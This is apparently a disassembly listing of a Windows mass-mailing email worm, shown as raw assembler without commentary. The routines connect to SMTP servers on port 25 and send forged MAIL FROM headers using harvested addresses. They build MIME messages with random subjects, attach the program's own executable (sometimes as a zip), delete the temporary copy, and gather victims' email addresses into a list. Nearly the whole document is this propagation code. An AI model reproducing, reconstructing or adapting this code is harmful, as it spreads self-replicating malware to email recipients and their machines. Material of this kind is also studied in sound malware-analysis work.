; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401D9B	proc near		; CODE XREF: sub_401E62+183p
					; sub_401E62+1E3p ...

var_400		= dword	ptr -400h
buf		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 400h
		cmp	[ebp+buf], 0
		push	ebx
		push	esi
		push	edi
		jz	short loc_401DD8
		push	0		; flags
		push	[ebp+buf]	; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		mov	eax, [ebp+arg_4]
		push	[ebp+buf]	; buf
		push	dword ptr [eax]	; s
		call	ds:send
		test	eax, eax
		jz	loc_401E5B
		cmp	eax, 0FFFFFFFFh
		jz	loc_401E5B

loc_401DD8:				; CODE XREF: sub_401D9B+10j
					; sub_401D9B+B9j
		push	1
		lea	eax, [ebp+var_400]
		pop	edi
		xor	ebx, ebx
		lea	esi, [ebp+var_400]
		sub	edi, eax

loc_401DEB:				; CODE XREF: sub_401D9B+76j
		mov	eax, [ebp+arg_4]
		push	0		; flags
		push	1		; len
		push	esi		; buf
		push	dword ptr [eax]	; s
		call	ds:recv
		test	eax, eax
		jl	short loc_401E56
		jz	short loc_401E13
		mov	al, [esi]
		inc	ebx
		inc	esi
		cmp	al, 0Ah
		jz	short loc_401E13
		lea	eax, [edi+esi]
		cmp	eax, 400h
		jb	short loc_401DEB

loc_401E13:				; CODE XREF: sub_401D9B+64j
					; sub_401D9B+6Cj
		and	byte ptr [ebp+ebx+var_400], 0
		test	ebx, ebx
		jle	short loc_401E5B
		lea	ecx, [ebp+var_400]
		xor	eax, eax

loc_401E27:				; CODE XREF: sub_401D9B+99j
		mov	dl, [ecx]
		cmp	dl, 20h
		jz	short loc_401E33
		cmp	dl, 9
		jnz	short loc_401E36

loc_401E33:				; CODE XREF: sub_401D9B+91j
		inc	ecx
		jmp	short loc_401E27
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401E36:				; CODE XREF: sub_401D9B+96j
					; sub_401D9B+B2j
		mov	dl, [ecx]
		cmp	dl, 30h
		jl	short loc_401E4F
		cmp	dl, 39h
		jg	short loc_401E4F
		movsx	edx, dl
		lea	eax, [eax+eax*4]
		inc	ecx
		lea	eax, [edx+eax*2-30h]
		jmp	short loc_401E36
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401E4F:				; CODE XREF: sub_401D9B+A0j
					; sub_401D9B+A5j
		cmp	byte ptr [ecx],	2Dh
		jnz	short loc_401E5D
		jmp	short loc_401DD8
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401E56:				; CODE XREF: sub_401D9B+62j
		or	eax, 0FFFFFFFFh
		jmp	short loc_401E5D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401E5B:				; CODE XREF: sub_401D9B+2Ej
					; sub_401D9B+37j ...
		xor	eax, eax

loc_401E5D:				; CODE XREF: sub_401D9B+B7j
					; sub_401D9B+BEj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401D9B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401E62	proc near		; CODE XREF: sub_403038+56p

Filename	= byte ptr -13CCh
var_FCC		= byte ptr -0FCCh
var_BCC		= byte ptr -0BCCh
var_ACC		= byte ptr -0ACCh
var_6CD		= byte ptr -6CDh
PathName	= byte ptr -6CCh
name		= byte ptr -2CCh
var_24C		= byte ptr -24Ch
var_1E8		= byte ptr -1E8h
String1		= byte ptr -1ACh
var_16C		= byte ptr -16Ch
buf		= byte ptr -124h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_14		= dword	ptr -14h
optval		= byte ptr -10h
var_C		= dword	ptr -0Ch
var_5		= byte ptr -5
s		= dword	ptr -4
lpString	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 13CCh
		call	__alloca_probe
		and	[ebp+String1], 0
		push	ebx
		mov	ebx, [ebp+lpString]
		push	esi
		mov	esi, ds:lstrlenA
		push	edi
		push	ebx		; lpString
		xor	edi, edi
		call	esi ; lstrlenA
		test	eax, eax
		jle	short loc_401EAD

loc_401E8B:				; CODE XREF: sub_401E62+35j
		cmp	byte ptr [edi+ebx], 40h
		jz	short loc_401E9B
		push	ebx		; lpString
		inc	edi
		call	esi ; lstrlenA
		cmp	edi, eax
		jl	short loc_401E8B
		jmp	short loc_401EAD
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401E9B:				; CODE XREF: sub_401E62+2Dj
		lea	eax, [edi+ebx+1]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpyA

loc_401EAD:				; CODE XREF: sub_401E62+27j
					; sub_401E62+37j
		cmp	[ebp+String1], 0
		jz	loc_402785
		lea	eax, [ebp+String1]
		push	eax
		call	sub_40156C
		mov	esi, eax
		pop	ecx
		test	esi, esi
		jz	loc_402785
		lea	eax, [esi+4]
		push	eax		; lpString2
		lea	eax, [ebp+name]
		push	eax		; lpString1
		call	ds:lstrcpyA
		push	esi
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		lea	eax, [ebp+name]
		push	eax		; name
		call	ds:gethostbyname
		mov	esi, eax
		test	esi, esi
		jz	loc_402785
		push	10h		; size_t
		lea	eax, [ebp+var_24]
		push	0		; int
		push	eax		; void *
		call	_memset
		mov	eax, [esi+0Ch]
		push	4		; size_t
		push	dword ptr [eax]	; void *
		lea	eax, [ebp+var_20]
		push	eax		; void *
		call	_memcpy
		add	esp, 18h
		mov	word ptr [ebp+var_24], 2
		push	19h		; hostshort
		call	ds:htons
		push	6		; protocol
		push	1		; type
		push	2		; af
		mov	word ptr [ebp+var_24+2], ax
		call	ds:socket
		mov	esi, ds:setsockopt
		lea	ecx, [ebp+optval]
		push	4		; optlen
		push	ecx		; optval
		mov	edi, 0FFFFh
		push	1006h		; optname
		push	edi		; level
		push	eax		; s
		mov	[ebp+s], eax
		mov	dword ptr [ebp+optval],	3A98h
		call	esi ; setsockopt
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		push	1005h		; optname
		push	edi		; level
		push	[ebp+s]		; s
		call	esi ; setsockopt
		lea	eax, [ebp+var_24]
		push	10h		; namelen
		push	eax		; name
		push	[ebp+s]		; s
		call	ds:connect
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_401F8E
		xor	esi, esi
		jmp	loc_402778
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401F8E:				; CODE XREF: sub_401E62+123j
		call	sub_401D73
		push	21h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 1Ah
		jle	short loc_401FB4
		call	sub_401D73
		cdq
		mov	ecx, 106h
		idiv	ecx
		mov	eax, ds:off_408298[edx*4]
		jmp	short loc_401FC6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401FB4:				; CODE XREF: sub_401E62+13Aj
		call	sub_401D73
		push	51h
		cdq
		pop	ecx
		idiv	ecx
		mov	eax, ds:dword_408154[edx*4]

loc_401FC6:				; CODE XREF: sub_401E62+150j
		mov	[ebp+var_C], eax
		call	sub_401D73
		cdq
		idiv	ds:dword_417C18
		lea	eax, [ebp+s]
		push	eax
		push	0
		mov	esi, ds:dword_40DB10[edx*4]
		mov	[ebp+var_14], esi
		call	sub_401D9B
		mov	ebx, 0C8h
		pop	ecx
		cmp	eax, ebx
		pop	ecx
		jl	loc_402757
		cmp	eax, 190h
		jge	loc_402757
		lea	eax, [ebp+buf]
		push	offset aEhlo	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+String1]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		mov	edi, offset buf	; "\r\n"
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401D9B
		add	esp, 20h
		cmp	eax, ebx
		jl	short loc_402058
		cmp	eax, 12Bh
		jle	short loc_4020AF

loc_402058:				; CODE XREF: sub_401E62+1EDj
		lea	eax, [ebp+buf]
		push	offset aHelo	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+String1]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401D9B
		add	esp, 20h
		cmp	eax, ebx
		jl	loc_402757
		cmp	eax, 12Bh
		jg	loc_402757

loc_4020AF:				; CODE XREF: sub_401E62+1F4j
		lea	eax, [ebp+buf]
		push	offset aMailFrom ; char	*
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+buf]
		push	esi		; char *
		push	eax		; char *
		call	_strcat
		mov	esi, offset asc_40AB58 ; ">\r\n"
		lea	eax, [ebp+buf]
		push	esi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401D9B
		add	esp, 20h
		cmp	eax, ebx
		jl	loc_402757
		cmp	eax, 12Bh
		jg	loc_402757
		lea	eax, [ebp+buf]
		push	offset aRcptTo	; char *
		push	eax		; char *
		call	_strcpy
		push	[ebp+lpString]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	esi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401D9B
		add	esp, 20h
		cmp	eax, ebx
		jl	loc_402757
		cmp	eax, 12Bh
		jg	loc_402757
		lea	eax, [ebp+buf]
		push	offset aData	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401D9B
		add	esp, 10h
		cmp	eax, ebx
		jl	loc_402757
		cmp	eax, 18Fh
		jg	loc_402757
		call	sub_401D73
		push	21h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 0Fh
		setnle	[ebp+var_5]
		call	sub_401D73
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_ACC]
		push	ds:off_4086B0[edx*4] ; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		call	sub_401D73
		push	21h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 18h
		jle	short loc_402203
		lea	eax, [ebp+var_ACC]
		push	offset a_	; char *
		push	eax		; char *
		call	_strcat
		call	sub_401D73
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_ACC]
		push	ds:off_4086B0[edx*4] ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 10h

loc_402203:				; CODE XREF: sub_401E62+36Dj
		cmp	[ebp+var_5], 0
		jz	loc_402314
		mov	esi, 400h
		lea	eax, [ebp+PathName]
		push	esi		; uSize
		push	eax		; lpBuffer
		call	ds:GetWindowsDirectoryA
		lea	eax, [ebp+PathName]
		push	eax		; char *
		call	_strlen
		cmp	[ebp+eax+var_6CD], 5Ch
		pop	ecx
		jz	short loc_40224A
		lea	eax, [ebp+PathName]
		push	offset asc_40AB3C ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_40224A:				; CODE XREF: sub_401E62+3D3j
		lea	eax, [ebp+var_ACC]
		push	eax		; char *
		lea	eax, [ebp+var_FCC]
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		call	sub_401D73
		push	21h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 0Ah
		jle	short loc_40228F
		call	sub_401D73
		push	6
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_FCC]
		push	ds:off_408858[edx*4] ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_40228F:				; CODE XREF: sub_401E62+40Bj
		call	sub_401D73
		push	6
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_FCC]
		push	ds:off_408840[edx*4] ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_ACC]
		push	offset a_zip	; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_ACC]
		push	eax		; char *
		lea	eax, [ebp+PathName]
		push	eax		; char *
		call	_strcat
		add	esp, 18h
		lea	eax, [ebp+Filename]
		push	esi		; nSize
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+var_FCC]
		push	eax
		lea	eax, [ebp+PathName]
		push	eax
		lea	eax, [ebp+Filename]
		push	eax
		call	sub_4017AD
		lea	eax, [ebp+var_1E8]
		push	offset aContentTypeApp ; char *
		push	eax		; char *
		call	_strcpy
		add	esp, 14h
		jmp	short loc_40238B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402314:				; CODE XREF: sub_401E62+3A5j
		call	sub_401D73
		push	0Dh
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 6
		jle	short loc_402344
		call	sub_401D73
		push	6
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_ACC]
		push	ds:off_408858[edx*4] ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_402344:				; CODE XREF: sub_401E62+4C0j
		call	sub_401D73
		push	6
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_ACC]
		push	ds:off_408840[edx*4] ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+PathName]
		pop	ecx
		push	400h		; nSize
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+var_1E8]
		push	offset aContentTypeA_0 ; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_40238B:				; CODE XREF: sub_401E62+4B0j
		lea	eax, [ebp+buf]
		push	offset aFrom	; char *
		push	eax		; char *
		call	_strcpy
		push	[ebp+var_14]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aTo	; char *
		push	eax		; char *
		call	_strcat
		push	[ebp+lpString]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aSubject	; char *
		push	eax		; char *
		call	_strcat
		push	[ebp+var_C]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		add	esp, 40h
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aDate	; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_BCC]
		push	eax
		call	sub_401B67
		lea	eax, [ebp+var_BCC]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aMimeVersion1_0 ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 24h
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		mov	esi, ds:send
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		call	sub_401D73
		push	eax
		call	sub_401D73
		push	eax
		call	sub_401D73
		push	0Fh
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_24C]
		push	edx
		push	0
		push	offset a_nextpart__3u_ ; LPCSTR
		push	eax		; LPSTR
		call	ds:wsprintfA
		push	offset aContentTypeMul ; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_24C]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset asc_40AA38 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aXPriority3 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aXMsmailPriorit ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 40h
		lea	eax, [ebp+buf]
		push	offset aThisIsAMultiPa ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+buf]
		pop	ecx
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		lea	eax, [ebp+var_16C]
		push	offset asc_40A9D0 ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_24C]
		push	eax		; char *
		lea	eax, [ebp+var_16C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_16C]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_16C]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+buf]
		push	offset aContentTypeTex ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 28h
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		call	sub_401D73
		cdq
		mov	ecx, 106h
		push	0		; flags
		idiv	ecx
		mov	edi, ds:off_408298[edx*4]
		push	edi		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		push	edi		; buf
		push	[ebp+s]		; s
		call	esi ; send
		lea	eax, [ebp+buf]
		push	offset asc_40A970 ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_16C]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_1E8]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_ACC]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aContentTransfe ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_ACC]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset asc_40A914 ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 38h
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		lea	eax, [ebp+PathName]
		push	0		; iReadWrite
		push	eax		; lpPathName
		call	ds:_lopen
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jz	loc_402757
		push	48h
		push	[ebp+s]
		push	edi
		call	sub_401CB2
		add	esp, 0Ch
		cmp	eax, 0FFFFFFFFh
		jz	loc_402757
		push	edi		; hFile
		call	ds:_lclose
		cmp	[ebp+var_5], 0
		jz	short loc_4026B1
		lea	eax, [ebp+PathName]
		push	eax
		call	_remove
		pop	ecx

loc_4026B1:				; CODE XREF: sub_401E62+840j
		lea	eax, [ebp+var_16C]
		push	offset asc_40A90C ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_24C]
		push	eax		; char *
		lea	eax, [ebp+var_16C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_16C]
		push	offset asc_40A904 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_16C]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+buf]
		push	offset a__0	; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401D9B
		add	esp, 30h
		cmp	eax, ebx
		jl	short loc_402757
		cmp	eax, 190h
		jg	short loc_402757
		lea	eax, [ebp+buf]
		push	offset aQuit	; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+buf]
		pop	ecx
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send

loc_402757:				; CODE XREF: sub_401E62+191j
					; sub_401E62+19Cj ...
		cmp	[ebp+var_5], 0
		jz	short loc_40276A
		lea	eax, [ebp+PathName]
		push	eax
		call	_remove
		pop	ecx

loc_40276A:				; CODE XREF: sub_401E62+8F9j
		push	2		; how
		push	[ebp+s]		; s
		call	ds:shutdown
		push	1
		pop	esi

loc_402778:				; CODE XREF: sub_401E62+127j
		push	[ebp+s]		; s
		call	ds:closesocket
		mov	eax, esi
		jmp	short loc_402787
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402785:				; CODE XREF: sub_401E62+52j
					; sub_401E62+69j ...
		xor	eax, eax

loc_402787:				; CODE XREF: sub_401E62+921j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
sub_401E62	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40278E	proc near		; CODE XREF: sub_402A51+18Ap
					; sub_402A51+1A5p

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		xor	ecx, ecx

loc_402794:				; CODE XREF: sub_40278E+1Cj
		mov	al, [ecx+edx]
		test	al, al
		jz	short loc_40279F
		cmp	al, 0Ah
		jnz	short loc_4027A3

loc_40279F:				; CODE XREF: sub_40278E+Bj
		mov	byte ptr [ecx+edx], 20h

loc_4027A3:				; CODE XREF: sub_40278E+Fj
		inc	ecx
		cmp	ecx, 1000h
		jl	short loc_402794
		and	byte ptr [edx+1000h], 0
		retn
sub_40278E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4027B4	proc near		; CODE XREF: sub_402A51+1B1p

var_1000	= byte ptr -1000h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 1000h
		call	__alloca_probe
		push	esi
		lea	eax, [ebp+var_1000]
		push	offset word_417C20 ; char *
		push	eax		; char *
		call	_strcpy
		mov	esi, [ebp+arg_0]
		pop	ecx
		pop	ecx
		xor	ecx, ecx
		xor	eax, eax

loc_4027DC:				; CODE XREF: sub_4027B4+51j
		mov	dl, [eax+esi]
		test	eax, eax
		jle	short loc_4027F7
		cmp	dl, 20h
		jnz	short loc_4027F7
		cmp	[eax+esi-1], dl
		jnz	short loc_4027FF
		mov	[ebp+ecx+var_1000], dl
		jmp	short loc_4027FE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4027F7:				; CODE XREF: sub_4027B4+2Dj
					; sub_4027B4+32j
		mov	[ebp+ecx+var_1000], dl

loc_4027FE:				; CODE XREF: sub_4027B4+41j
		inc	ecx

loc_4027FF:				; CODE XREF: sub_4027B4+38j
		inc	eax
		cmp	eax, 0FFFh
		jl	short loc_4027DC
		and	[ebp+ecx+var_1000], 0
		lea	eax, [ebp+var_1000]
		push	eax		; char *
		push	esi		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		pop	esi
		leave
		retn
sub_4027B4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_402821	proc near		; CODE XREF: sub_4028A4+15Bp

arg_0		= dword	ptr  8

		push	ebx
		mov	ebx, [esp+arg_0]
		push	esi
		push	edi
		mov	esi, offset off_408114

loc_40282D:				; CODE XREF: sub_402821+23j
		push	dword ptr [esi]	; char *
		push	ebx		; char *
		call	_strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_4028A0
		add	esi, 4
		cmp	esi, offset dword_408154
		jl	short loc_40282D
		mov	eax, ds:dword_417C18
		cmp	eax, 27FFh
		jg	short loc_4028A0
		xor	esi, esi
		test	eax, eax
		jle	short loc_402877
		mov	edi, offset dword_40DB10

loc_40285D:				; CODE XREF: sub_402821+54j
		push	ebx		; char *
		push	dword ptr [edi]	; char *
		call	_strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_4028A0
		inc	esi
		add	edi, 4
		cmp	esi, ds:dword_417C18
		jl	short loc_40285D

loc_402877:				; CODE XREF: sub_402821+35j
		push	ebx		; char *
		call	_strlen
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, ds:dword_417C18
		push	ebx		; char *
		push	eax		; char *
		mov	ds:dword_40DB10[ecx*4],	eax
		call	_strcpy
		add	esp, 10h
		inc	ds:dword_417C18

loc_4028A0:				; CODE XREF: sub_402821+18j
					; sub_402821+2Fj ...
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_402821	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4028A4	proc near		; CODE XREF: sub_402A51+17Bp
					; sub_402A51+196p ...

var_38		= byte ptr -38h
var_37		= byte ptr -37h
var_36		= byte ptr -36h
var_34		= byte ptr -34h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		push	edi		; char *
		call	_strlen
		xor	ebx, ebx
		xor	esi, esi
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+var_C], eax
		mov	[ebp+var_8], ebx
		jz	loc_402A19
		and	[ebp+var_1], 0

loc_4028CD:				; CODE XREF: sub_4028A4:loc_402A13j
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_C]
		jge	loc_402A19
		cmp	ds:byte_406590[esi], 0
		jz	short loc_4028FE
		mov	ecx, ds:off_4080AC[esi*4]
		mov	dl, [eax+edi]
		cmp	dl, [ecx]
		jnz	short loc_4028F4
		inc	ebx
		inc	esi
		jmp	short loc_4028F8
